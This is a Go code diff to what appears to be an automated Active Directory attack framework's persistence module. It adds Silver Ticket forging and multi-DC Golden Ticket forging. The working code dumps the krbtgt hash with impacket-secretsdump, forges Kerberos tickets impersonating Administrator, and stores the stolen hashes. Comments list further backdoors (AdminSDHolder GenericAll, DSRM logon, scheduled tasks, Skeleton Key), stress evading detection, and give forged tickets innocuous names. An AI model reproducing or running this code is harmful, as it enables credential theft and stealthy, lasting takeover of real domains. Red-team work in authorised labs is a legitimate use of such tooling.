@@ -20,6 +20,7 @@ import (
 // Techniques (best-effort, tool-gated):
 //   - Scheduled task on logon (SYSTEM)            → schtasks via failover exec
 //   - Golden Ticket forging                       → secretsdump + impacket-ticketer
+//   - Silver Ticket forging (per service account) → impacket-ticketer -spn
 //   - DSRM password-reuse logon enable            → reg add via failover exec
 //   - AdminSDHolder GenericAll backdoor           → impacket-dacledit (preferred)
 //     or bloodyAD (fallback)
@@ -55,7 +56,7 @@ func RunPersistence(state *core.ADState, targetHost string) *core.ToolResult {
 		deployed++
 	}
 	if host.IsDC {
-		if deployGoldenTicket(ctx, host, domain, user, pass, hash, result) {
+		if deployGoldenTicket(ctx, host, domain, user, pass, hash, result, state) {
 			deployed++
 		}
 		if deployAdminSDHolder(ctx, host, domain, user, pass, hash, result) {
@@ -64,6 +65,14 @@ func RunPersistence(state *core.ADState, targetHost string) *core.ToolResult {
 		flagSkeletonKeyOpportunity(host, result)
 	} else {
 		fmt.Println("[*] Target is not a DC — skipping Golden Ticket / AdminSDHolder / Skeleton Key")
+	}
+
+	// Silver Ticket runs against any host, not just the DC — it only needs a
+	// previously captured service account hash and the domain SID. Crucially
+	// it bypasses the KDC entirely so it works even when AdminSDHolder /
+	// Golden Ticket are blocked by DC-side detections.
+	if n := deploySilverTickets(state, host, domain, user, pass, hash, result); n > 0 {
+		deployed += n
 	}
 
 	if deployed == 0 {
@@ -137,7 +146,7 @@ func deployDSRM(ctx context.Context, exec core.Executor, host core.Host, result 
 //     operator can KRB5CCNAME it for follow-on commands.
 //
 // This requires DA-level creds (already enforced upstream by validation phase).
-func deployGoldenTicket(ctx context.Context, host core.Host, domain, user, pass, hash string, result *core.ToolResult) bool {
+func deployGoldenTicket(ctx context.Context, host core.Host, domain, user, pass, hash string, result *core.ToolResult, state *core.ADState) bool {
 	_ = ctx
 	fmt.Println("[*] Forging Golden Ticket (secretsdump krbtgt → impacket-ticketer)...")
 
@@ -150,31 +159,86 @@ func deployGoldenTicket(ctx context.Context, host core.Host, domain, user, pass,
 		return false
 	}
 
-	authSpec := buildImpacketAuth(domain, user, pass, hash, host.IP)
-
-	// Pull just the krbtgt secret + the domain SID from the DC.
-	args := []string{authSpec, "-just-dc-user", "krbtgt"}
-	args = append(args, impacketHashArgs(hash)...)
-	r := utils.RunCommandTimeout(2*time.Minute, "impacket-secretsdump", args)
-	if !r.Success {
-		fmt.Printf("[!] secretsdump krbtgt failed: %s\n", r.Stderr)
-		return false
+	// Collect all DC IPs to try. Try the primary host first, then any additional
+	// DCs from state (handles multi-domain where user is DA in one domain's DC
+	// but not another's).
+	dcIPs := []string{host.IP}
+	for _, h := range state.Hosts {
+		if h.IsDC && h.IP != host.IP && h.IP != "" {
+			dcIPs = append(dcIPs, h.IP)
+		}
 	}
 
-	krbtgtHash := extractKrbtgtNTHash(r.Stdout)
-	if krbtgtHash == "" {
-		fmt.Println("[!] Could not extract krbtgt NT hash from secretsdump output")
-		return false
+	var lastErr string
+	for _, dcIP := range dcIPs {
+		authSpec := buildImpacketAuth(domain, user, pass, hash, dcIP)
+
+		// Pull just the krbtgt secret + the domain SID from the DC.
+		args := []string{authSpec, "-just-dc-user", "krbtgt"}
+		args = append(args, impacketHashArgs(hash)...)
+		r := utils.RunCommandTimeout(2*time.Minute, "impacket-secretsdump", args)
+		if !r.Success {
+			lastErr = strings.TrimSpace(r.Stderr)
+			fmt.Printf("[!] secretsdump krbtgt failed on %s: %s\n", dcIP, lastErr)
+			continue
+		}
+
+		// Distinguish between "auth/priv rejected by DC" and "secretsdump succeeded
+		// but our extractor missed the hash" — they need very different operator
+		// responses (escalate to DA vs fix the parser).
+		combined := r.Stdout + "\n" + r.Stderr
+		lower := strings.ToLower(combined)
+		switch {
+		case strings.Contains(lower, "rpc_s_access_denied") ||
+			strings.Contains(lower, "drs_s_access_denied") ||
+			strings.Contains(lower, "status_access_denied") ||
+			strings.Contains(lower, "dra_bad_dn") ||
+			strings.Contains(lower, "name_error_not_unique"):
+			fmt.Printf("[!] Golden Ticket: %s\\%s lacks DCSync rights on %s — needs Replicating Directory Changes\n",
+				domain, user, dcIP)
+			lastErr = "access_denied"
+			continue
+		case strings.Contains(lower, "logon_failure") ||
+			strings.Contains(lower, "kdc_err_preauth_failed") ||
+			strings.Contains(lower, "invalid credentials") ||
+			strings.Contains(lower, "status_logon_failure"):
+			fmt.Printf("[!] Golden Ticket: auth rejected for %s\\%s on %s — credentials are wrong\n",
+				domain, user, dcIP)
+			return false // auth won't work on any DC
+		}
+
+		krbtgtHash := extractKrbtgtNTHash(r.Stdout)
+		if krbtgtHash == "" {
+			fmt.Printf("[!] Golden Ticket: secretsdump on %s succeeded but krbtgt NT hash not in output\n", dcIP)
+			lastErr = "parser_miss"
+			continue
+		}
+
+		// Hash found! Now resolve the domain SID via impacket-lookupsid.
+		domainSID := resolveDomainSID(domain, user, pass, hash, dcIP)
+		if domainSID == "" {
+			fmt.Println("[!] Could not resolve domain SID via impacket-lookupsid")
+			return false
+		}
+
+		// We have both krbtgt hash and domain SID — forge the ticket.
+		return forgeAndSaveTicket(krbtgtHash, domainSID, domain, result)
 	}
 
-	// secretsdump -just-dc-user does not print Domain SID, so resolve it via
-	// impacket-lookupsid (cheap, single LSAR call). Cache miss → bail.
-	domainSID := resolveDomainSID(domain, user, pass, hash, host.IP)
-	if domainSID == "" {
-		fmt.Println("[!] Could not resolve domain SID via impacket-lookupsid")
-		return false
+	// All DCs exhausted.
+	switch lastErr {
+	case "access_denied":
+		fmt.Printf("[!] Golden Ticket: no DC found where %s\\%s has DCSync rights — need DA in target domain\n", domain, user)
+	case "parser_miss":
+		fmt.Println("[!] Golden Ticket: secretsdump ran but krbtgt hash not in output (parser miss or empty replication response)")
+	default:
+		fmt.Printf("[!] Golden Ticket: all DCs failed — last error: %s\n", lastErr)
 	}
+	return false
+}
 
+// forgeAndSaveTicket runs impacket-ticketer and records the forged ticket + krbtgt hash.
+func forgeAndSaveTicket(krbtgtHash, domainSID, domain string, result *core.ToolResult) bool {
 	ts := time.Now().Unix()
 	ccacheUser := fmt.Sprintf("svc_health_%d", ts)
 	ccachePath := fmt.Sprintf("/tmp/golden_%s.ccache", ccacheUser)
@@ -191,11 +255,9 @@ func deployGoldenTicket(ctx context.Context, host core.Host, domain, user, pass,
 		return false
 	}
 
-	// impacket-ticketer writes <user>.ccache in CWD; move it deterministically.
 	moveR := utils.RunCommandTimeout(10*time.Second, "mv",
 		[]string{fmt.Sprintf("%s.ccache", ccacheUser), ccachePath})
 	if !moveR.Success {
-		// Not fatal — the ccache exists somewhere reachable
 		ccachePath = fmt.Sprintf("./%s.ccache", ccacheUser)
 	}
 
@@ -207,13 +269,169 @@ func deployGoldenTicket(ctx context.Context, host core.Host, domain, user, pass,
 		Value:      ccachePath,
 		Confidence: 0.95, RawOutput: tr.Stdout, Timestamp: time.Now(),
 	})
-	// Also record the krbtgt hash itself as a credential so future runs can re-forge.
 	result.Creds = append(result.Creds, core.Credential{
 		Type: core.CredHash, Username: "krbtgt", Domain: domain,
 		Hash: krbtgtHash, Secret: krbtgtHash,
-		Source: "secretsdump_persistence", Target: host.IP, Validated: true,
+		Source: "secretsdump_persistence", Target: "", Validated: true,
 	})
 	return true
+}
+
+// silverTicketCandidate is one hash + SPN pair derived from state.Creds.
+type silverTicketCandidate struct {
+	username string // account whose hash signs the ticket (no $ suffix dropped — preserved as-is)
+	hash     string // NT hash of that service principal
+	spn      string // SPN this hash unlocks (e.g. cifs/dc01.sevenkingdoms.local)
+	source   string // provenance for evidence (kerberoast, secretsdump, etc.)
+}
+
+// collectSilverTicketCandidates walks state.Creds + state.Users to find
+// service accounts we hold NT hashes for, paired with at least one SPN.
+//
+// Two sources qualify:
+//
+//  1. Machine accounts (Username ends with '$') with a hash — the SPN is
+//     derived from the corresponding host (cifs/<host>.<domain> by default).
+//  2. Kerberoasted user accounts where state.Users contains SPNs — each
+//     SPN becomes a candidate.
+//
+// We don't emit duplicates; first occurrence wins.
+func collectSilverTicketCandidates(state *core.ADState, domain string) []silverTicketCandidate {
+	seen := make(map[string]bool)
+	var out []silverTicketCandidate
+
+	// Index users → SPNs for fast lookup by SAM name.
+	userSPNs := make(map[string]string)
+	for _, u := range state.Users {
+		if u.SPNs == "" {
+			continue
+		}
+		userSPNs[strings.ToLower(u.SAMAccountName)] = u.SPNs
+		if u.Username != "" {
+			userSPNs[strings.ToLower(u.Username)] = u.SPNs
+		}
+	}
+
+	for _, c := range state.Creds {
+		if c.Type != core.CredHash || c.Hash == "" {
+			continue
+		}
+		// Machine account: derive SPN from username (strip trailing $).
+		if strings.HasSuffix(c.Username, "$") {
+			machine := strings.TrimSuffix(c.Username, "$")
+			spn := fmt.Sprintf("cifs/%s.%s", strings.ToLower(machine), strings.ToLower(domain))
+			key := c.Username + "|" + spn
+			if seen[key] {
+				continue
+			}
+			seen[key] = true
+			out = append(out, silverTicketCandidate{
+				username: c.Username, hash: c.Hash, spn: spn, source: c.Source,
+			})
+			continue
+		}
+		// Kerberoasted user: one candidate per SPN we know about.
+		spns, ok := userSPNs[strings.ToLower(c.Username)]
+		if !ok || spns == "" {
+			continue
+		}
+		for _, spn := range strings.Split(spns, ",") {
+			spn = strings.TrimSpace(spn)
+			if spn == "" {
+				continue
+			}
+			key := c.Username + "|" + spn
+			if seen[key] {
+				continue
+			}
+			seen[key] = true
+			out = append(out, silverTicketCandidate{
+				username: c.Username, hash: c.Hash, spn: spn, source: c.Source,
+			})
+		}
+	}
+	return out
+}
+
+// deploySilverTickets forges one Silver Ticket per (service-hash, SPN) pair
+// discovered in state. Returns the number of tickets successfully written.
+//
+// Silver Tickets are dramatically quieter than Golden Tickets because they
+// never contact the KDC — the attacker encrypts the TGS directly with the
+// service's NT hash. Detection requires service-side logs (rare in practice)
+// or PAC-validation enforcement (not default).
+//
+// References:
+//   - Sean Metcalf, "Sneaky Persistence: AD Silver Tickets"
+//   - impacket examples/ticketer.py --spn flag
+func deploySilverTickets(state *core.ADState, host core.Host, domain, user, pass, hash string, result *core.ToolResult) int {
+	candidates := collectSilverTicketCandidates(state, domain)
+	if len(candidates) == 0 {
+		fmt.Println("[*] No service hashes in state — skipping Silver Ticket")
+		return 0
+	}
+	if _, err := utils.FindTool("impacket-ticketer"); err != nil {
+		fmt.Println("[!] impacket-ticketer not found, skipping Silver Ticket")
+		return 0
+	}
+
+	domainSID := resolveDomainSID(domain, user, pass, hash, host.IP)
+	if domainSID == "" {
+		fmt.Println("[!] Could not resolve domain SID — skipping Silver Ticket")
+		return 0
+	}
+
+	fmt.Printf("[*] Forging Silver Tickets for %d service hash(es)...\n", len(candidates))
+
+	// Impersonate "Administrator" by default — operator can change later by
+	// re-running with KRB5CCNAME pointed at the forged ticket.
+	impersonated := "Administrator"
+
+	deployed := 0
+	for _, c := range candidates {
+		ts := time.Now().Unix()
+		// Encode SPN into filename so multiple tickets don't clobber each other.
+		safeSPN := strings.NewReplacer("/", "_", ":", "-", "\\", "_").Replace(c.spn)
+		ccachePath := fmt.Sprintf("/tmp/silver_%s_%d.ccache", safeSPN, ts)
+
+		args := []string{
+			"-nthash", c.hash,
+			"-domain-sid", domainSID,
+			"-domain", domain,
+			"-spn", c.spn,
+			impersonated,
+		}
+		r := utils.RunCommandTimeout(60*time.Second, "impacket-ticketer", args)
+		if !r.Success {
+			fmt.Printf("    ✗ %s: ticketer failed — %s\n", c.spn,
+				strings.TrimSpace(r.Stderr))
+			continue
+		}
+
+		// impacket-ticketer writes <impersonated>.ccache in CWD; move it
+		// deterministically per-SPN.
+		moveR := utils.RunCommandTimeout(10*time.Second, "mv",
+			[]string{fmt.Sprintf("%s.ccache", impersonated), ccachePath})
+		if !moveR.Success {
+			ccachePath = fmt.Sprintf("./%s.ccache", impersonated)
+		}
+
+		fmt.Printf("    ✓ %s → %s (signed by %s)\n", c.spn, ccachePath, c.username)
+		result.Evidence = append(result.Evidence, core.EvidenceEntry{
+			Type: core.EvCredAcquired, Phase: core.PhasePersistence,
+			Source: "silver_ticket",
+			Key:    impersonated + "@" + c.spn,
+			Value: fmt.Sprintf("ccache=%s signer=%s spn=%s (source=%s)",
+				ccachePath, c.username, c.spn, c.source),
+			Confidence: 0.9, RawOutput: r.Stdout, Timestamp: time.Now(),
+		})
+		deployed++
+	}
+
+	if deployed > 0 {
+		fmt.Printf("[+] %d Silver Ticket(s) forged. Use: export KRB5CCNAME=<path>\n", deployed)
+	}
+	return deployed
 }
 
 // deployAdminSDHolder grants GenericAll on the AdminSDHolder container so the
